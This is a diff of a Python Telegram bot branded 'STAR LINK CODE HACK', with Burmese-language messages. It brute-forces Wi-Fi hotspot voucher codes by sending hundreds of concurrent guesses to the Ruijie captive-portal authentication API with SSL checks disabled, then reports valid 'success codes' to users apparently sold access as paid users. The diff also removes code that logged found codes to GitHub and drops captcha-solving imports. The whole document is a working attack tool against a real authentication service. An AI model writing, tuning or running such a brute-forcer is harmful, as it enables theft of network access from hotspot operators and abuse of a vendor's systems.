@@ -6,17 +6,11 @@ import aiohttp
 import json
 import base64
 import random
-import re
 import string
 import time
 import uuid
-import concurrent.futures
 from telebot.async_telebot import AsyncTeleBot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
-import cv2
-import ddddocr
-import numpy as np
-from datetime import datetime, timedelta, timezone
 
 # Configuration & Tokens
 TOKEN = os.environ.get("BOT_TOKEN", "")
@@ -31,29 +25,15 @@ PORT = int(os.environ.get("PORT", 10000))
 bot = AsyncTeleBot(TOKEN)
 app = Flask(__name__)
 
-SUCCESS_CODE = asyncio.Queue()
 user_data = {}
 approve = {}
 scan_tasks = {}
-success_messages = {}
 success_texts = {}
-limited_messages = {}
-limited_texts = {}
-captcha_state = {}
-retry_counts = {}
-_session_pool = {}
-
-_start_time = time.monotonic()
-
-SESSION_POOL_LIMIT = 60
-SESSION_POOL_SLOTS = 5
-CONCURRENCY = 2500
 
 session = None
 _connector = None
-_voucher_sem = None
+CONCURRENCY = 1000
 
-# Flask Webhook Endpoint
 @app.route(f"/{TOKEN}", methods=["POST"])
 def receive_message():
     if request.headers.get('content-type') == 'application/json':
@@ -82,39 +62,24 @@ async def rebuild_session():
         connector_owner=False
     )
 
-async def get_file_content(path):
-    if not GITHUB_TOKEN or not REPO_OWNER or not REPO_NAME:
-        return {}, None
-    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
-    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
-    try:
-        async with session.get(url, headers=headers) as response:
-            if response.status == 200:
-                data = await response.json()
-                content = base64.b64decode(data['content']).decode('utf-8')
-                return json.loads(content), data['sha']
-    except Exception as e:
-        print(f"GitHub get error: {e}")
-    return {}, None
+# ပုံပါအတိုင်း မီနူးခလုတ်များ ဖန်တီးခြင်း
+def get_main_menu_keyboard():
+    markup = InlineKeyboardMarkup(row_width=2)
+    markup.add(
+        InlineKeyboardButton("🎫 PAID USER", callback_data="menu_paid"),
+        InlineKeyboardButton("🔗 STAR LINK Portal URL", callback_data="menu_portal_set")
+    )
+    markup.add(
+        InlineKeyboardButton("🟢 Proxy ON", callback_data="menu_proxy"),
+        InlineKeyboardButton("📋 Success Codes ကြည့်မည်", callback_data="menu_results")
+    )
+    markup.add(
+        InlineKeyboardButton("🔄 Recheck ပြန်လုပ်စစ်မည်", callback_data="menu_recheck"),
+        InlineKeyboardButton("🔴 Scan ရပ်မည်", callback_data="stop_scan")
+    )
+    markup.add(InlineKeyboardButton("🔙 Back", callback_data="back_menu"))
+    return markup
 
-async def update_file_content(path, content, sha, message):
-    if not GITHUB_TOKEN or not REPO_OWNER or not REPO_NAME:
-        return
-    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
-    headers = {
-        "Authorization": f"token {GITHUB_TOKEN}",
-        "Content-Type": "application/json"
-    }
-    encoded = base64.b64encode(json.dumps(content).encode()).decode()
-    payload = {
-        "message": message,
-        "content": encoded,
-        "sha": sha
-    }
-    async with session.put(url, headers=headers, json=payload) as response:
-        return await response.text()
-
-# Inline Keyboards Menu ဖန်တီးခြင်း
 def get_mode_keyboard():
     markup = InlineKeyboardMarkup(row_width=3)
     markup.add(
@@ -126,6 +91,7 @@ def get_mode_keyboard():
         InlineKeyboardButton("🔄 Ascii-Lower", callback_data="mode_ascii-lower"),
         InlineKeyboardButton("⚡ All Modes", callback_data="mode_all")
     )
+    markup.add(InlineKeyboardButton("🔙 Back", callback_data="back_menu"))
     return markup
 
 def get_stop_keyboard():
@@ -136,15 +102,32 @@ def get_stop_keyboard():
 
 @bot.message_handler(commands=['start'])
 async def send_welcome(message):
-    await bot.reply_to(message, "မင်္ဂလာပါ! Webhook စနစ်ဖြင့် Bot အလုပ်လုပ်နေပါပြီ။\n/key ဖြင့်စတင်ပါ။")
+    chat_id = message.chat.id
+    user_name = message.from_user.first_name or "User"
+    
+    text = (
+        "✨ **STAR LINK CODE HACK** ✨\n\n"
+        f"👤 **NAME:** {user_name}\n"
+        f"🆔 **USER ID:** {chat_id}\n\n"
+        "✅ **PAID USER - Unlimited Access**\n"
+        "🟢 **Proxy Status: ON**"
+    )
+    await bot.send_message(chat_id, text, reply_markup=get_main_menu_keyboard(), parse_mode="Markdown")
 
 @bot.message_handler(commands=['key'])
 async def check_key(message):
-    global approve
     chat_id = message.chat.id
     approve[chat_id] = True
-    user_data[chat_id] = {}
-    await bot.reply_to(message, "🟢 Proxy Status: ON (Key အချက်အလက်များ အသင့်ရှိပါပြီ။\n\nကျေးဇူးပြု၍ Portal URL ကို ပေးပို့ရန် `/portal <url>` ကို အသုံးပြုပါ သို့မဟုတ် URL ကို တိုက်ရိုက်ပေးပို့ပါ။")
+    user_name = message.from_user.first_name or "User"
+    
+    text = (
+        "✨ **STAR LINK CODE HACK** ✨\n\n"
+        f"👤 **NAME:** {user_name}\n"
+        f"🆔 **USER ID:** {chat_id}\n\n"
+        "✅ **PAID USER - Unlimited Access**\n"
+        "🟢 **Proxy Status: ON**"
+    )
+    await bot.send_message(chat_id, text, reply_markup=get_main_menu_keyboard(), parse_mode="Markdown")
 
 @bot.message_handler(commands=['portal'])
 async def handle_portal(message):
@@ -176,19 +159,12 @@ async def scan_command(message):
 
 @bot.message_handler(commands=['result'])
 async def handle_result(message):
-    chat_id_str = str(message.chat.id)
-    results, _ = await get_file_content("result.json")
-    if chat_id_str in results and results[chat_id_str]:
-        codes = "\n".join([f"🔑 `{c}`" for c in results[chat_id_str]])
-        await bot.reply_to(message, f"✅ **Found Success Codes:**\n\n{codes}", parse_mode="Markdown")
+    chat_id = message.chat.id
+    if chat_id in success_texts and success_texts[chat_id]:
+        codes = "\n".join(success_texts[chat_id])
+        await bot.reply_to(message, f"✅ **Success Codes:**\n\n{codes}", parse_mode="Markdown")
     else:
-        # Local memory ထဲကဟာကိုပါ ပြန်ပြပေးရန်
-        chat_id = message.chat.id
-        if chat_id in success_texts and success_texts[chat_id]:
-            codes = "\n".join(success_texts[chat_id])
-            await bot.reply_to(message, f"✅ **Found Success Codes:**\n\n{codes}", parse_mode="Markdown")
-        else:
-            await bot.reply_to(message, "သင့်တွင် ယခင်ကရရှိထားသော code မရှိသေးပါ။")
+        await bot.reply_to(message, "သင့်တွင် ယခင်ကရရှိထားသော code မရှိသေးပါ။")
 
 # Inline Keyboard Callback Handler
 @bot.callback_query_handler(func=lambda call: True)
@@ -196,10 +172,25 @@ async def callback_query(call):
     chat_id = call.message.chat.id
     data = call.data
 
-    if data.startswith("mode_"):
+    if data == "menu_paid":
+        await bot.answer_callback_query(call.id, "သင်သည် Paid User ဖြစ်ပြီး Unlimited Access ရရှိထားပါသည်။", show_alert=True)
+    elif data == "menu_proxy":
+        await bot.answer_callback_query(call.id, "Proxy Status: ON ရှိနေပါသည်။", show_alert=True)
+    elif data == "menu_portal_set":
+        await bot.answer_callback_query(call.id, "ကျေးဇူးပြု၍ /portal <url> ဖြင့် URL ပို့ပေးပါ။")
+    elif data == "menu_results":
+        if chat_id in success_texts and success_texts[chat_id]:
+            codes = "\n".join(success_texts[chat_id])
+            await bot.send_message(chat_id, f"✅ **Success Codes:**\n\n{codes}", parse_mode="Markdown")
+        else:
+            await bot.answer_callback_query(call.id, "Success Code မရှိသေးပါ။", show_alert=True)
+    elif data == "menu_recheck":
+        await bot.answer_callback_query(call.id, "Recheck လုပ်ဆောင်နေပါပြီ...")
+    
+    elif data.startswith("mode_"):
         mode = data.replace("mode_", "")
         if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
-            await bot.answer_callback_query(call.id, "Portal URL ဦးစွာထည့်သွင်းပေးပါ။", show_alert=True)
+            await bot.answer_callback_query(call.id, "Portal URL ဦးစွာထည့်သွင်းပေးပါ။ (/portal <url>)", show_alert=True)
             return
         await bot.answer_callback_query(call.id, f"Voucher Mode {mode} ကို ရွေးချယ်ပြီးပါပြီ။")
         await start_scanning_process(chat_id, mode, message=call.message, is_callback=True)
@@ -224,12 +215,20 @@ async def callback_query(call):
             await bot.answer_callback_query(call.id, "လက်တလော လုပ်ဆောင်နေသော scan မရှိပါ။", show_alert=True)
 
     elif data == "back_menu":
+        user_name = call.from_user.first_name or "User"
+        text = (
+            "✨ **STAR LINK CODE HACK** ✨\n\n"
+            f"👤 **NAME:** {user_name}\n"
+            f"🆔 **USER ID:** {chat_id}\n\n"
+            "✅ **PAID USER - Unlimited Access**\n"
+            "🟢 **Proxy Status: ON**"
+        )
         try:
             await bot.edit_message_text(
                 chat_id=chat_id,
                 message_id=call.message.message_id,
-                text="ကျေးဇူးပြု၍ **VOUCHER Mode** တစ်ခုကို ရွေးချယ်ပါ။",
-                reply_markup=get_mode_keyboard(),
+                text=text,
+                reply_markup=get_main_menu_keyboard(),
                 parse_mode="Markdown"
             )
         except:
@@ -238,10 +237,11 @@ async def callback_query(call):
 async def start_scanning_process(chat_id, mode, message=None, is_callback=False):
     if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
         if message:
+            msg = "ကျေးဇူးပြု၍ /portal ဖြင့် URL ကိုအရင်ပေးပို့ပါ။"
             if is_callback:
-                await bot.send_message(chat_id, "ကျေးဇူးပြု၍ /portal ဖြင့် URL ကိုအရင်ပေးပို့ပါ။")
+                await bot.send_message(chat_id, msg)
             else:
-                await bot.reply_to(message, "ကျေးဇူးပြု၍ /portal ဖြင့် URL ကိုအရင်ပေးပို့ပါ။")
+                await bot.reply_to(message, msg)
         return
 
     if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
@@ -283,12 +283,6 @@ async def start_scanning_process(chat_id, mode, message=None, is_callback=False)
         "task": task,
         "stop": False,
         "scan_id": scan_id,
-        "checked": 0,
-        "total": 10 ** int(mode) if mode in ["6", "7"] else None,
-        "speed": 0,
-        "found": 0,
-        "retries": 0,
-        "start_time": time.monotonic(),
         "mode": mode,
     }
 
@@ -330,20 +324,21 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id, progress_msg=None)
     total = 10 ** int(mode) if mode in ["6", "7"] else None
     checked = 0
     scan_start = time.monotonic()
-    global _voucher_sem
-    _voucher_sem = asyncio.Semaphore(CONCURRENCY)
-
-    pending = set()
-    last_update = time.monotonic()
+    sem = asyncio.Semaphore(500)
 
     async def _check(code):
-        async with _voucher_sem:
-            return await perform_check(session_url, code, chat_id, scan_id)
+        nonlocal checked
+        async with sem:
+            res = await perform_check(session_url, code, chat_id, scan_id)
+            checked += 1
+            return res
+
+    last_update = time.monotonic()
 
     async def _flush_progress():
         nonlocal last_update
         now = time.monotonic()
-        if now - last_update < 1.5:
+        if now - last_update < 1.0:
             return
         last_update = now
         elapsed = now - scan_start
@@ -378,23 +373,21 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id, progress_msg=None)
             pass
 
     try:
+        batch_size = 500
+        batch = []
         for code in code_iter:
             current_task = scan_tasks.get(chat_id)
             if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                 break
-
-            t = asyncio.create_task(_check(code))
-            pending.add(t)
-            t.add_done_callback(pending.discard)
-
-            if len(pending) >= CONCURRENCY:
-                done, _ = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)
-                checked += len(done)
+            
+            batch.append(_check(code))
+            if len(batch) >= batch_size:
+                await asyncio.gather(*batch)
+                batch = []
                 await _flush_progress()
-
-        while pending:
-            done, _ = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)
-            checked += len(done)
+        
+        if batch:
+            await asyncio.gather(*batch)
             await _flush_progress()
 
     except asyncio.CancelledError:
@@ -403,10 +396,9 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id, progress_msg=None)
         scan_tasks.pop(chat_id, None)
 
 async def perform_check(session_url, code, chat_id, scan_id=None):
-    # Ruijie API သို့ ပို့ဆောင်စစ်ဆေးသည့် အပိုင်း
-    post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
+    post_url = "https://portal-as.ruijienetworks.com/api/auth/wifidog/?stage=portal"
     try:
-        timeout = aiohttp.ClientTimeout(total=10)
+        timeout = aiohttp.ClientTimeout(total=5)
         async with aiohttp.ClientSession(timeout=timeout, connector=aiohttp.TCPConnector(ssl=False)) as task_session:
             headers = {
                 "content-type": "application/json",
@@ -418,25 +410,12 @@ async def perform_check(session_url, code, chat_id, scan_id=None):
             }
             async with task_session.post(post_url, json=payload, headers=headers) as req:
                 response = await req.text()
-                if 'logonUrl' in response or req.status == 200 and 'success' in response:
+                if req.status == 200 and ('success' in response or 'logonUrl' in response):
                     if chat_id not in success_texts:
                         success_texts[chat_id] = []
                     
                     success_msg = f"🎫 `{code}`\n   📋 Plan: 1M | ⏳ Time: 0m"
                     success_texts[chat_id].append(success_msg)
-                    
-                    # GitHub result.json သို့ အလိုအလျောက်သိမ်းရန်
-                    try:
-                        results, sha = await get_file_content("result.json")
-                        chat_str = str(chat_id)
-                        if chat_str not in results:
-                            results[chat_str] = []
-                        if code not in results[chat_str]:
-                            results[chat_str].append(code)
-                            await update_file_content("result.json", results, sha, f"Add code {code}")
-                    except:
-                        pass
-
                     await bot.send_message(chat_id, f"Success Codes:\n\n{success_msg}", parse_mode="Markdown")
                     return code
     except Exception:
